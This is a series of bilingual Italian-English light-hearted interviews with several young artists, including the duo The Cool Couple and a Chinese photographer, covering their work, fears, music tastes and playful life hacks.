E’ una performance sulla mia autobiografia, sulla relazione tra me e le mie sorelle, ma anche sulla relazione tra le sorelle Williams, Venus e Serena, e confonde un po’ le due cose. Mio padre gioca a tennis ed era davvero ossessionato con il farci diventare le prossime sorelle Williams, cosa abbastanza comune. E anche mio fratello, sarebbe stato come le prossime sorelle Williams. Ci portava sempre sul campo da gioco locale e giocava regolarmente. Non eravamo così brave, come ho detto, ma sai, li piaceva così tanto e non volevamo deluderlo. Salivamo sempre in macchina al ritorno e dicevamo “Papà, papà! Dacci un voto!’ e lui diceva ‘Ook, oggi Rosa un 7 per la precisione e un 5 per la velocità’ e questo genere di cose. Sono sempre stato una tennista molto lento, le palle che colpivo erano inaspettatamente lente, quindi questa era la mia arma segreta.
Vestiti larghi o aderenti?
Voglio dire stretti, so che è meglio, ma diró vestiti larghi.. purtroppo. E’ un peccato lo so. So che è patriarcale dire che è un peccato, ma abbiamo vent’anni, siamo giovani, dovremmo indossare abiti stretti, non abbiamo più molto tempo a disposizione! Dovremmo accettare il nostro corpo in ogni fase e se indossi abiti sciolti tutto il tempo non saprai nemmeno com’è veramente il tuo corpo. Ho visto questo film Irma Vep, degli anni ’90, è un film francese. In cui il personaggio indossa una specie di abito di spandex da bondage per tutto il film. È una specie di scherzo che vuole essere una satira del cinema francese. Ogni volta che si muove fa un rumore tipo “chrrrrrrrrr”
Una canzone che ascolti in loop?
In realtà non ascolto musica, è davvero un peccato… Ascolto solo il servizio mondiale della BBC, costantemente. Trovo che metta tutto in prospettiva.
Se dovessi scegliere una spezia essenziale?
Scary Spice!
Le Spice Girls tornano in tournée, giusto?
Sì, sto cercando di ottenere un biglietto gratuito ed è per questo che sto menzionando Scary Spice! Basta menzionarle sulla stampa, in un podcast e forse possono trovarmi un biglietto gratuito. Sto immaginando questo pannello di donne dove hanno bisogno di qualcuno che venga a parlare delle Spice Girls e io sto solo cercando di posizionarmi come un’esperta haha…..
Un progetto che non hai mai iniziato o mai finito?
Ne ho uno sulle orecchie piccole, ho guardato su internet e ho semplicemente zoomato sulle orecchie da vicino e poi le ho fatte di argilla. Ho le orecchie di Obama. Non so davvero cosa farne, mi piacciono tutte queste orecchie, sono solo ossessionata. Non so cosa succederà alle orecchie, sono davvero strane. Ho anche l’uomo cheddar, questo uomo preistorico che hanno trovato in Inghilterra, che è il primo segno europeo dell’uomo, hanno ricostruito il suo volto e io ho rifatto il suo naso con un po di argilla hahaha!
Con quale cattivo personaggio ti identifichi?
Direi boss baby. Boss baby è un cattivo? Conoscete il Boss baby? Non credo di aver visto il film, ma ho solo visto le sue immagini. È un bambino ma è un boss, c’è qualcosa in lui. C’è anche una serie TV su Netflix, che ho visto.
Sei contenta o fiera di una cosa per la quale non sei dotata?
Penso che sia ballare. Sono piuttosto negata a ballare, ma mi piace molto e ovviamente faccio molte performance in cui ballo.
Che life hack ci puoi dare?
Il life hack di mia nonna sarebbe qualcosa come bere del brandy ti libera da singhiozzi o qualcosa del genere, haha.
L’altro giorno ho cancellato l’applicazione e-mail dal mio telefono. Non so se sia solo inutile, ma mi ha fatto sentire bene in quel momento. E ‘stato liberatorio solo l’atto di cancellare. Il mio ragazzo mi diceva “puoi veramente cancellare l’applicazione e-mail?” e io ho risposto “Sì! Lo farò” e lui diceva: “No! Non farlo! Non farlo! Sarà davvero fastidioso”, “Sì! Lo faro’” e basta! E l’ho fatto! E’ stato eccitante. Cancella la mail app!
Sento che con la cancellazione della applicazione e-mail sto davvero andando da qualche parte, come se stessi davvero arrivando al cuore del telefono, essendo una delle applicazioni essenziali. Potrei provare a cancellare l’applicazione orologio ……che è un’atto un po’ pazzo haha. Ho intenzione di farlo! Lo faró! Ma si può fare? Qualcuno l’ha mai fatto prima? Oh mio Dio, sì, lo farò quando finisce questa chiamata!
Una domanda che ti sei fatta ultimamente?
Se devo essere onesta, la domanda che mi sono posta è: Che ruolo ha l’etica nel fare arte? E’ una domanda piuttosto profonda….. Penso che la risposta potrebbe essere in un’altra domanda che è: perché faccio arte? Il motivo per cui faccio arte è che mi fa sentire bene, ma questo significa che posso fare qualsiasi cosa nell’arte per farmi sentire bene? Voglio dire, no, ovviamente perché non sono psicopatica….. ma è una domanda per me quando sto preparando una performance o pensando al pubblico per il mio lavoro artistico. Come si inserisce l’idea dell’accessibilità quando esploro creativamente qualcosa che potrebbe essere problematico? Vengo a questo da una prospettiva femminista di persone di colore, essendo una persona che è impegnata e interessata a un lavoro che riguarda la partecipazione e l’accessibilità, uno dei motivi principali per cui faccio un lavoro di questo tipo è perché penso che sia la cosa giusta da fare….. È questo fare l’opera d’arte più interessante? Non lo so…..ma è a questo che ho pensato di recente.

What would you be doing if you weren’t doing what you’re doing right now?
That’s an interesting question because in my previous life I was in online marketing, I lived in Sydney where I worked in online marketing and I have a degree in media. So I think I spent 6 years of my life doing something else before I went to art school and maybe that was my alternative life so I think I’ve arrived in art school and the art world with this feeling of ‘this is the only thing that I can do’ so I feel like any other answer wouldn’t be actually true.
Something online that stuck with you this week?
It was a youtube video where Hito Steyerl was being interviewed and they asked her how she would define contemporary, and I’m paraphrasing but it was something about ‘not being in sync and sort of about being fractured’. Hearing that was very generative, I really felt like this fed into my own work or how I maybe intuitively felt about modern life or the contemporary.
The most random thing you have in your wallet?
Oh my god, I don’t have a wallet! I don’t have a wallet, I lost my bank card a week ago, so it’s been very chaotic. I literally have 2 credit cards, an ID and a bunch of money, that’s it and it just hangs about in a bag, a tote bag. If somebody can donate a wallet…
Here’s My triple AAA bag where everything’s dumped in:
The last gig you went to?
I went to a gig at the Lexington in Camden because I reconnected with a friend I hadn’t seen in 10 months. He’s a bass player from South London and he just told me that he’s playing for La Roux and flying around the world. He has a booking agency and wears a lot of hats and every time I go out with him I end up going somewhere I’ve never been before. So we we ended up being at a gig of a band called Cocaine Piss, it’s a Belgian punk band and I think the name is brilliant because it really comes alive in your imagination.
If you could invite 3 family members (dead or alive) to hang out to a pool party who would that be?
That would be my grandmother, my great grandmother and my mother…wow that would be so sick!
This is a bit of a long story but the reason I chose these women is because it’s great to speak about a lineage of women obviously but also because my grandmother went missing in 1975, when my mother was about 6 years old. She was a nurse in the war in Cambodia and she went missing so my mother can’t really recall an image of her. My great grandmother I met in Sydney, she fled to Thailand and ended up living in Sydney. When I moved to Sydney she already suffered from dementia and couldn’t really chat with me because she forgot about everything and then she passed away. And my mum lives in Cambodia and last time I saw her was almost 4 years ago, so I’d love to have these three women in one swimming pool, all healthy because in any normal situation there would have been a chance to chat and to be each other’s mothers but because of the war and life none of that has ever happened within these 3 generations.
What was your favourite item of clothing as a child?
Wow…it was a yellow dress made out of cotton and it was very simple but my favourite colour at the time was yellow.
What’s the best advice you received?
It’s not really advice but I asked a friend of mine, who graduated from the Royal College of Art in Curating 6 years ago and who’s now doing very well, I asked him: How did you do this? How did you manage to create what you have right now in 6 years? Not many people do what he does and I have a trajectory of trying really fucking hard and I can beat myself up for thinking ‘I try so hard, where can I see the fruits of the labour?’ or ‘Am I doing something wrong towards the end?’ or whether I just tend to make things really difficult for myself… And he said that the thing he changed in his life and that he recommends me to do is basically to believe in yourself. It sounds very hallmarky but at the time I really needed to hear it and lately I’ve been really using this advice from him in however ways my life needs it.
If you created your own country what would it be called?
Haha, probably Sambodia. It’s also my dj name when I dj but I never dj because I’m a horrible dj.
A museum you’d like to visit that you haven’t been to?
Ok, I would pick the Van Abbemusem in Eindhoven simply because I’m Dutch and I’ve never been. This is an illustration that I haven’t lived in my native country for 8 years and Van Abbe was known for some of the stuff I’m really interested in; the diversity, the participatory, reinventing the museum. Claire Bishop had a chapter on this museum in her book called Radical Museology… the reason I want to go is because I feel a sense of shame, I’m Dutch and I haven’t been, so I would definitely say that museum.
Life Hack?
Having a speaker with you. I think people generally have headphones anyways but I think having music with you that you can play out loud or just play at high quality. My life hack is that because it makes me feel safe. I think music is really feels safe not in the binary of safe/unsafe but it comforts me and puts me at ease. One of the works I’ve done is that I played music out loud and I had a whole mob behind me rapping, this was in CSM (Central Saint Martins) we went from the 1st floor to the 3rd floor. Music can bring a particular energy where people come together and unlock stuff. Another work I did was that I asked a lot of friends who were from different backgrounds to send me music that their parents used to play when they were younger (so music from the 90s that was culturally specific). Then I got on the tram in Antwerp were most of the foreigners congregate and I played the music on the tram… so when Moroccan people came I’d play Moroccan music, when Congolese people came I’d play Congolese music… So yes, music diffusing a chill vibe is a life hack I truly believe.

A question you’d like to ask?
Are you a person that would leave the house with 100% phone battery or are you one of those people that leaves with 30% phone battery?
I am 30%, stupid you know, that person whose phone always dies and always needs someone else’s power bank and I am just the way I am…

Cosa faresti se non stessi facendo quello che fai ora?
Questa è una domanda interessante perché nella mia vita di prima facevo del marketing online, vivevo a Sydney dove lavoravo in marketing online perché ho una laurea in media. Quindi penso di aver passato 6 anni della mia vita facendo qualcos’altro prima di studiare arte… magari quella era la mia vita alternativa e penso che sono arrivata ai miei studi artistici e nel mondo dell’arte con il sentimento che ‘questa sia l’unica cosa che io possa fare’ perciò penso che qualsiasi altra risposta a questa domanda sarebbe falsa.
Qualcosa che hai visto online questa settimana che ti ha colpito?
Era un video dove Hito Steyerl si faceva intervistare e gli hanno chiesto come definirebbe la contemporaneità, e sto parafrasando ma ha risposto qualcosa il linea con il ‘non essere in sync e in qualche modo essere fratturato’. Sentire ciò è stato molto generativo per me, alimentando il mio proprio lavoro o le mie intuizioni sulla vita moderna e il contemporaneo.
La cosa più a caso che hai nel tuo portafoglio?
Oh dio, non ho un portafoglio! Non ho un portafoglio, ho perso la mia carta di credito una settimana fa perciò la situazione è stata un po’ caotica. Ho letteralmente 2 carte di credito, una carta d’identità, dei soldini in giro dentro a una borsetta, un tote bag. Se qualcuno vuole donare un portafoglio…
Questa è la mia borsa dove mollo tutta la mia roba:
L’ultimo concerto a cui sei stata?
Sono stata a un concerto al Lexington a Camden (a Londra) perché ho rivisto un’amico che non ho visto ha 10 mesi. È del sud di Londra, suona il basso e mi ha detto che ultimamente suona per La Roux e sta viaggiando per il mondo. Ha un’agenzia di prenotazioni, indossa tanti cappelli, e ogni volta che andiamo da qualche parte mi porta in posti dove non sono mai stata. E quindi siamo finiti a un concerto di un gruppo che si chiama Cocaine Piss, è un gruppo punk belga e penso che il nome sia brillante perché lo puoi proprio immaginare.
Se potessi invitare 3 membri della tua famiglia (vivi o morti) ad una pool party, chi inviteresti?
Sarebbero mia nonna, la mia bis nonna e mia madre…wow quello sarebbe bellissimo!
Questa è una storia un po’ lunga ma la ragione per la quale ho scelto queste donne è perché penso sia ottimo parlare del lignaggio delle donne ma anche perché mia nonna è scomparsa nel 1975, quando mia madre aveva circa 6 anni. Era una un’infermiera nella guerra in Cambodia ed è scomparsa quindi mia madre non riesce neanche a ricomporre la sua immagine. Ho incontrato la mia bisnonna a Sydney, lei è fuggita in Thailandia ed è finita a vivere a Sydney. Quando mi sono trasferita a Sydney, soffriva di demenza e perciò non poteva veramente sostenere una conversazione con me perché non si ricordava di niente e poco dopo è venuta a mancare. Mia madre vive in Cambogia, l’ultima volta che l’ho vista era 4 anni fa. Perciò vorrei avere queste 3 donne in una piscina, tutte sane, perché in qualsiasi situazione normale avremmo avuto la fortuna di parlare e di essere le madri di ognuna ma per causa della guerra e della vita, niente di ciò e mai accaduto in queste 3 generazioni.
Cos’era il tuo abito preferito da piccola?
Wow… era un vestito giallo di cottone, era molto semplice ma il mio colore preferito al tempo era giallo.
Cos’è il miglior consiglio che hai ricevuto?
Non è veramente un consiglio ma ho chiesto a un mio amico, che si e laureato dalla Royal College of art in curatela 6 anni fa, che ora sta proprio bene, gli ho chiesto: Come hai fatto? Come sei riuscito a creare quello che hai creato che hai in 6 anni? Non tante persone riescono a fare quello che fa lui, io per esempio ho la traiettoria di provare facendo uno sforzo tremendo e di autoflagellarmi pensando ‘Provo così tanto, dov’è il frutto del mio lavoro?’ oppure ‘Sto facendo qualcosa di sbagliato verso la fine?’ o se rendo semplicemente la situazione difficile per me stessa… E lui mi disse che la cosa che ha cambiato nella sua vita e che consiglia è di sostanzialmente credere in se stessi. Questo suona molto cliché ma al tempo avevo proprio bisogno di sentirlo e ultimamente ho veramente usato il suo consiglio quando la mia vita ne aveva bisogno.
Se dovessi creare il tuo paese, come lo chiameresti?
Haha, probabilmente Sambodia. Questo e anche il mio nome dj, quando faccio il dj, ma non lo faccio spesso perché sono una pessima dj.
Un museo che ti piacerebbe visitare al quale non sei mai stata?
Ok, sceglierei il Van Abbemuseum in Eindhoven semplicemente perché sono Olandese e non sono mai stata. Questo è anche perché non ho vissuto nel mio paese natale da 8 anni e il Van Abbe è conosciuto per cose nelle quali sono molto interessata; la diversità, la partecipazione, la reinvenzione del museo. Claire Bishop ha un capitolo su questo museo nel suo libro Radical Museology…la ragione per la quale voglio andare è perché ho un senso di vergogna, sono Olandese e non sono mai stata, perciò direi proprio quel museo.
Hai un Life hack per noi?
Avere uno speaker con se. Penso che le persone hanno comunque generalmente degli auricolari ma penso che avere della musica con sé che uno può suonare ad alto volume o ad alta qualità. Questo e il mio life hack perché mi fa sentire sicura. Penso che la musica sia un posto sicuro, non nel senso binario di sicuro/insicuro ma che mi consoli e mi dia conforto. Una delle opere che ho fatto è che ho suonato della musica ad alto volume ed avevo un gruppo di gente dietro di me che rappava, questo era a CSM (Central Saint Martins) siamo andati dal primo al terzo piano. La musica può portare una certa energia permettendo alla gente di unirsi e di liberare alcune cose. Un’altro lavoro che ho fatto è uno dove ho chiesto a tanti amici di contesti culturali diversi di mandarmi la musica che che ascoltavano i loro genitori quando erano più giovani (perciò musica degli anni 90 di culture specifiche). Poi sono stata nel tram a Antwerp dove c’è una maggior congregazione con persone dell’estero per suonare questa musica… quando salivano persone del Marocco, suonavo musica Marocchina, quando c’erano persone del Congo, suonavo musica Congolese… Quindi si, la musica diffusa una buona energia in cui credo veramente.
Una domanda che vorresti fare?
Sei il tipo di persona che esce di casa con il cellulare carico al 100% oppure una di quelle persone con il 30%?
Io il 30%, idiota, quella persona a cui muore sempre il cellulare e che ha bisogno della batteria di qualcun altro, sono semplicemente così…
The Cool Couple
14.10.18 thecoolcouple.co.uk	
With Niccolò Benetton and Simone Santilli
What’s your biggest fear?
Niccolò Benetton: A fear we share, in a wide sense, is that of poverty. Instead, with regards to primordial fears, let’s say that I’m terrorised by insects (but not all of them). Stink bugs really drive me crazy.
Simone Santilli: On my end I tend to be really disgusted by things that slither.
The best moment of your summer? With a possible soundtrack?
S: Best moment of the summer… this question is making us quite paranoid, in the sense that it has been a very difficult and intense period. In one way the past months have flown by and in another there have been so many things that could have been really significant moments. Significant in terms of work, because we have basically worked the whole summer without taking any breaks (or maybe just one week’s break).
N: Possibly, the moment with the highest level of satisfaction and liberation was the exhibition inauguration at Mambo (in Bologna) on the 21st of June because we came to terms with a projects that lasted months. It was also been the launch of a new work for which we we had been doing a lot of research. Anyhow, it was a brief moment of joy because the next day we immediately started working on new projects that are due basically now. But the summer was dotted by many beautiful moments: we were in residence at Bocs Art and had a series of project developments (but Mambo remains the best).
…
S: The soundtrack on the other hand has varied quite a bit. We need to clarify something immediately: we very often use Spotify’s Weekly Discovery, so at least once a week we go around listening to our Weekly Discovery. So this soundtrack has been varied with some Afro sonorities and I’d say some techno ones.
N: Yes, quite techno… we also have a great passion for Fela Kuti and Newen Afrobeat. And I’m quite fond to things that are more hip hop. I’m trying to take interest in contemporary trends, even if I stay close to Wu-Tang Clan. And what else did we listen to?
S: We listened to Clap! Clap!
N: Ah! I also went to a Jon Hopkins concert, very nice! But yes, a summer of techno and afro beats, said in this manner doesn’t sound super appealing.
You favourite saying?
S: hmm absolutely nothing, nothing is coming to mind…I don’t really have a phrase I say often.
N: I’m very attached to Jim Jarmusch and in one of his famous interviews, speaking of the originality and of taking things from others, he quotes Jean-Luc Godard saying: “it’s not where you take things from it’s where you take them to”. This is one sentence I’m quite fond of.
S: Another one we say every now and this is: “It’s better to blush before that to turn white later”.
If you could work with anybody for your next project, who would that person be?
S: Well, first we’d have to understand if we would able to work at all… but we’re a bit torn because we could choose between someone from the art world or we could go further. It’s a difficult choice. I’d have inclinations for working with somebody who’s already dead, so that’s difficult. Otherwise I’d like to work on a project with Cristiano Ronaldo or Balotelli, but I think I’d also like to work with an alien because that would be really awesome.
N: I’d like to work with Kate Tempest or with Jim Jarmusch, that I’ve cited earlier, and obviously with GZA from Wu-Tang Clan.
S: I’d like to work with Alberto Angela and possibly also fishing out Giovanni Muciaccia from the corners of the past, the guy that used to do Art Attack.
The most and least sexy names that exist?
S: We’re a bit torn because our girlfriends will slap us, but I think I’m correct in saying that both of us agree to the fact that the name Camille could be quite sexy.
N: Or basically french names.
S: The problem is that we easily get fascinated by the voices of singers like Hope Sandoval, the singer of Mazzy Star and the voice in Paradise Circus of Massive Attack. That voice would make any name sound sexy.
N: The least sexy name is difficult to pinpoint because it’s generally tied to other fundamental characteristics of a person. Anti-sex is not something doesn’t only depend on a name but on a series of characteristics, I mean there are some unfortunate names but that doesn’t necessarily mean they’re not sexy. You could have an awful name but still be an extremely sexy person. Maybe compound names such as Mariastella or Piergiovanni, that you can then break into two names, so you can still find something sexy in there.
An object that shouldn’t exist?
N: I’m quite passionate about motors, so sometimes I see cars and motorbikes that I believe should not exist. If we can consider a car or motorbike as an object then I can provide you with a list.
S: We know that there are objects that shouldn’t exist but I can’t think of any right now in this moment.
N: For instance, amongst the cars, the Renault Cactus is a car so ugly it should not exist, just so we’re on the same page: the one with the rubber on top of the doors.
S: The corgi is a dog that should not exist, but in terms of objects of everyday life nothing is coming to mind, even though we know that there are some. Hogans should not exist for instance, or those orthopedic shoes that have that curved sole in order for your back to stay straight; very trendy amidst university professors of a certain age. Mosquitoes too, if they can be considered an object that should not exist.
N: Mosquitoes aren’t an object but I have found the name of a motorbike that should not exist, it’s called Honda DN01, this one really shouldn’t exist.
S: The fiat multipla is another car that ought not to exist.
N: Oh we got it! We had it in mind the whole time: the object that ought not to exist is the man satchel! That disgusting thing Italians wear with a shoulder strap, it hurts the eyes and really characterises the Italian man abroad. We can tolerate the fanny-pack/bum bag but the satchel no. If I saw someone on a Honda DN-01 with a satchel I don’t know how I’d react.
Still or sparkling water?
S: Water for me is still and and for Niccolò it’s sparkling.
If you could have assisted to an event in history which one would that be?
S: I’d probably go back to see the assassination of Julius Caesar. Pompei would have been another marvellous thing to see.
N: I would love to have spent an evening with Caravaggio, for that one I’d pay gold. And personally I’d love to have seen the 1936 Berlin Olympics.
Life hack to share with us?
S: So we’ve tested this recently and it works: if you need to go back home by bicycle, it’s pouring and you have nothing to protect yourselves with, we built an a rain jacket from a space blanket and paper tape. It works very well.
Your last selfies?
A question you might like to ask yourselves?
S: When to stop? Will the time come when you decide it’s enough
14.10.18 thecoolcouple.co.uk	
Con Niccolò Benetton e Simone Santilli
La vostra paura più’ grande?
Niccolò Benetton: Paura che condividiamo, nel senso molto ampio, è quella della povertà. Invece, per quanto riguarda le paure ataviche, diciamo che io sono terrorizzato dagli insetti in genere, anche se non tutti. Le cimici sono una cosa che mi manda via di testa.
Simone Santilli: Mentre a me, tendenzialmente, fa schifo tutto quello che striscia.
Momento migliore della vostra estate? Soundtrack?
S: Momento migliore della nostra estate…questa domanda ci ha mandato un po’ in paranoia, nel senso che è stato un periodo molto difficile, intenso. Da un lato gli scorsi mesi sono volati via in un attimo e dall’altro ci sono state tantissime cose che in realtà potrebbero essere dei momenti significativi. Significativi lavorativamente parlando, perché abbiamo praticamente lavorato tutta l’estate senza pause, se non per una settimana.
N: Forse il momento più alto al livello di soddisfazione e liberazione è stato l’inaugurazione del Mambo il 21 Giugno che ha culminato un progetto lungo mesi. E’ stato anche il lancio di un nuovo lavoro dopo un po’ di tempo che ci stavamo facendo ricerca. Tuttavia si è trattato di una gioia molto breve, perché, dal giorno dopo, abbiamo iniziato a lavorare su altri progetti che sono in scadenza adesso. Ma l’estate è stata punteggiata da tanti momenti belli: siamo stati in residenza a Bocs Art e c’è stata tutta una serie di sviluppi di progetti nuovi, ma il top è stato il Mambo.
S: La colonna sonora invece è stata piuttosto variegata. Bisogna subito precisare una cosa: che è molto spesso il Discovery Weekly di Spotify, per cui una volta alla settimana andiamo in giro ascoltando i nostri Discovery Weekly. La colonna sonora quindi è variegata, imprevedibile, con delle punte di sonorità Afro e delle altre direi techno.
N: Sì abbastanza techno… abbiamo una grande passione per Fela Kuti e i Newen Afrobeat. Poi io rimango sempre abbastanza affezionato a delle cose più hip hop. Sto cercando di interessarmi un po’ di più delle tendenze contemporanee, anche se resto sempre molto affezionato ai Wu-Tang Clan. E poi cosa abbiamo ascoltato?
S: Abbiamo ascoltato i Clap! Clap!
N: Ah! Io ho anche visto in concerto Jon Hopkins, molto bello! Però sì, è stata un’estate di techno e Afro che detta così non suona un cazzo bene.
La vostra frase preferita?
S: Io, zero assoluto, non mi viene in mente nulla, non ho una frase che dico spesso.
N: Io invece sono molto affezionato a Jim Jarmusch e c’è una sua intervista famosa dove, parlando dell’originalità e del fatto di prendere cose dagli altri cita Jean-Luc Godard dicendo: “it’s not where you take things from it’s where you take them to”. E questa è una frase alla quale sono abbastanza affezionato.
S: Un’altra frase che diciamo ogni tanto: “è meglio arrossire prima che sbiancare poi”.
Se vi dicessimo che per il vostro prossimo progetto potreste lavorare con chiunque nel mondo. Chi sarebbe?
S: Intanto, bisognerebbe capire se riusciremo a lavorare… Però qui siamo abbastanza combattuti perché potremmo scegliere tra personalità del mondo dell’arte oppure potremmo andare anche aldilà. E’ una scelta abbastanza difficile. Avrei delle propensioni per lavorare con persone che però sono già morte, quindi sarebbe difficile. Altrimenti mi piacerebbe tentare un progetto con Cristiano Ronaldo oppure Balotelli, però io preferirei l’alieno perché mi prenderebbe benissimo.
N: Io vorrei lavorare con Kate Tempest oppure con Jim Jarmusch, che ho citato prima, e ovviamente GZA di Wu-Tang Clan.
S: Vorrei lavorare con Alberto Angela e anche ripescare dalle pieghe del tempo Giovanni Muciaccia, quello che faceva Art Attack.
I nomi più e meno sexy che ci siano?
S: Siamo un po’ combattuti, perché le nostre rispettive ragazze ci prenderanno a schiaffi, però mi sembra che siamo abbastanza d’accordo sul fatto che Camille potrebbe essere un nome abbastanza sexy.
N: O nomi tendenzialmente francesi.
S: Il problema è che spesso ci facciamo facilmente affascinare dalla voce di cantanti come Hope Sandoval, la cantante dei Mazzy Star e la voce in Paradise Circus dei Massive Attack. Quella voce farebbe diventare sexy qualsiasi nome.
N: Nome meno sexy è molto difficile perché si lega ad altre caratteristiche fondamentali di una persona. L’anti-sesso è una cosa che non dipende solo dal nome, ma da tutta una serie di caratteristiche: ci sono i nomi sfigati, ma non era necessariamente anti-sesso. Potresti avere un nome bruttissimo ed essere una persona estremamente sexy. Forse in realtà non sono anti-sesso nemmeno i nomi composti tipo Mariastella o Piergiovanni, che puoi smembrare nei rispettivi nomi e quindi ci trovi comunque del sexy.
Un oggetto che non dovrebbe esistere?
N: Io sono abbastanza appassionato di motori, quindi ogni tanto vedo delle macchine o delle moto che sono veramente delle cose che non dovrebbero esistere. Se possiamo considerare oggetto anche tipo un’auto o una moto potrei farvi un elenco per oggetto.
S: Sappiamo che ci sono degli oggetti che non dovrebbero esistere però non ci vengono in mente così su due piedi.
N: Ad esempio, tra le auto, la Renault Cactus è una macchina così brutta che non dovrebbe esistere, quella coi gommini sulle portiere, per capirci.
S: Il Corgi è un cane che non dovrebbe esistere, però di oggetti della vita quotidiana in realtà non ci viene in mente niente anche se sappiamo che ci sono. Le Hogan non dovrebbero esistere, per esempio, e anche quelle scarpe ortopediche che hanno la suola un po’ stondata che sono quelle per tenere su la schiena che vanno molto di moda tra i docenti universitari di una certa età.
Anche le zanzare se si possono considerare un oggetto non dovrebbero esistere.
N: Le zanzare non sono un oggetto. Ma ho trovato il nome di una moto che non dovrebbe esistere si chiama Honda DN01, questa non dovrebbe proprio esistere.
S: La fiat Multipla è un’altra macchina che non dovrebbe esistere.
N: Ci siamo arrivati adesso! Ce l’avevamo in testa! L’oggetto che non dovrebbe esistere è il borsello da uomo! Quello schifo che si mettono un sacco di italiani a tracolla, che è una cosa inguardabile e soprattutto caratterizza subito l’italiano all’estero. Possiamo tollerare il marsupio, ma il borsello no. Se vedessi qualcuno con una Honda DN-01 e un borsello non so come potrei reagire.
Acqua frizzante o naturale?
S: L’acqua per me è Naturale, per Niccolò frizzante.
Se poteste avere assistito personalmente a un evento nella storia, quale sarebbe?
S: Io andrei indietro per vedermi l’assassinio di Giulio Cesare probabilmente. Concordiamo sul fatto che Pompei sarebbe stata un’altra bellissima cose da vedere.
N: A me piacerebbe tantissimo avere fatto una serata con Caravaggio: per quella pagherei oro. E poi mi sarebbe molto, ma molto, piaciuto vedere le olimpiadi del 1936 di Berlino.
Life hack da condividere?
S: Allora l’abbiamo testato di recente e funziona benissimo: se dovete tornare a casa in bicicletta, diluvia, e non avete niente con cui proteggervi, abbiamo costruito un impermeabile con una copertina termica e il nastro carta e funziona molto bene.
I vostri ultimi selfies?
Domanda che vi piacerebbe farvi?
S: Quando smettete? Arriverà il momento che deciderete che sia abbastanza?

What are you afraid of?
I am afraid of making mistakes.
What was your favourite band as a child?
Umm, I don’t really have one, I have a singer. Britney Spears, first time I saw the Oops!… I Did It Again video I thought she was like a barbie, really pretty, really cute. I think my friend had a DVD of her and we watched it together.
If you could eat something from home right now, what would it be?
A mooncake, because it’s going to be the Mid-Autumn Festival soon and around this time we have mooncake.
Could you show us the 3 last pictures you took with your phone?
I’ll chose some because I’ve just started my PhD so my last three ones are screenshots of my course information.
How long did your last project take to make?
It took me more than one year. It was the one I showed at my degree show, it’s called Your Reservation Is Confirmed.
Who are the subjects of the images?
They were men I found through a weird website, people on it are willing to be naked on photographs and for drawings. Some of them you pay very little, some of them do it for free. The photos are all taken in airbnbs and with arranging the models, every shot takes a long time to arrange. I spent more time planning and thinking, most of the time I already knew what I wanted to shoot, so the shooting process is short. I spent a long time choosing the picture and printing in analog.
In the series, all the subjects except you are white men, this is a choice you made right?
I started My Tinder Boys first, where I took photograph a black man as well, but it didn’t work, not because of race but of the photo had technical issues. Then I had some tutorials and I realized my work isn’t about race but it kind of is there, because I’m Asian. I think it works because there is a Western gaze towards Asian women, from white men.
Mango or pear?
Mango… I just think pear is a bit boring. In my mind apples and pears are the most boring fruit. I don’t know why but I guess it’s because they’re really common in China.
What’s the last exhibition you paid to go see?
It’s called the Abstract Eye at the Tate Modern, it was about photography and light. Actually, it’s called The Shape of Light, I remembered it completely wrong! It wasn’t the most exciting exhibition but I thought it was well curated.
Best subject to photograph?
Men.
Life hack?
If it’s something that can be told by grandparents, in China we have a lot of that bullshit that I don’t believe haha… But I know that if you put chopsticks or something long (like cooking chopsticks are really long) over the pot with boiling water, the water will not come out. It really does work!
Something you’ve been asking yourself lately?
Lately I’ve been asking myself a lot about what I really want to do in my life.
Did you find an answer?
No, I think I’m still very confused. I ask myself: do you really want to be an artist? And if I want to be an artist which direction do I want to go? We all wonder this no? Like now, I’m doing my PhD but If I was not what would I be doing after school? If I was not doing my PhD I think I would try to find a job so I can survive and then try to make work and find a balance I guess.

Di cosa hai paura?
Ho paura di fare errori.
Qual era la tua band preferita da piccola?
Umm, in realtà non ne ho una, ho una cantante. Britney Spears, la prima volta che ho visto il video di Oops!… I Did It Again ho pensato che fosse come una barbie, molto bella, molto carina. Penso che la mia amica avesse un suo DVD e lo guardavamo insieme.
Se potessi mangiare qualcosa da casa in questo momento, cosa sarebbe?
Una torta lunare, perché presto è la festa di metà autunno e in questo periodo mangiamo torte lunari.
Potresti mostrarci le ultime 3 foto che hai scattato con il tuo telefono?
Ne sceglierò alcune perché ho appena iniziato un PhD, quindi le ultime tre sono screenshots di informazioni sul mio corso.
Quanto tempo ci è voluto per completare il tuo ultimo progetto?
Mi ci è voluto più di un anno. È quello che ho mostrato al mio degree show, si chiama Your Reservation Is Confirmed.
Chi sono le persone fotografate?
Sono uomini che ho trovato attraverso un sito strano, dove la gente è disposta ad essere nuda per delle fotografie e per dei disegni. Alcuni paghi molto poco, altri lo fanno gratuitamente. Le foto sono tutte scattate in airbnb e con il fatto di dovere organizzare i modelli, ogni scatto richiede molto tempo per essere impostato. Ho passato più tempo a pianificare e pensare; la maggior parte del tempo già sapevo cosa volevo scattare, quindi il processo di ripresa è breve. Ho anche passato molto tempo a scegliere le immagini e fare le stampe in analogico.
Nella serie, tutti i soggetti ad eccezione di te sono uomini bianchi, questa è una scelta che hai fatto giusto?
Ho iniziato con My Tinder Boys, dove ho fotografato anche un uomo nero, ma la foto non ha funzionato, non per motivi di colore di pelle ma per problemi tecnici. Poi ho avuto alcuni tutorial e mi sono resa conto che il mio lavoro non riguarda il colore della pelle ma questo è un aspetto comunque presente, perché sono asiatica. Penso che le immagini funzionino perché c’è uno sguardo occidentale verso le donne asiatiche, soprattutto dagli uomini bianchi.
Qual è l’ultima mostra che hai pagato per andare a vedere?
Si chiama Abstract Eye alla Tate Modern, trattava di fotografia e luce. In realtà, si chiama The Shape of Light, il mio ricordo è completamente sbagliato! Non è stata la mostra più eccitante, ma ho pensato che fosse ben curata.
Il miglior soggetto da fotografare?
Uomini.
Life hack?
Se è qualcosa che dicono i nonni, in Cina abbiamo un sacco di cavolate alle quali non credo haha. Ma so che se metti le bacchette o qualcosa di lungo (tipo le bacchette per cucinare che sono davvero lunghe) sopra la pentola con acqua bollente, l’acqua non uscirà. Funziona davvero!
Qualcosa che ti sei chiesta ultimamente?
Ultimamente mi sono chiesta molte volte cosa voglio davvero fare nella mia vita.
Hai trovato una risposta?
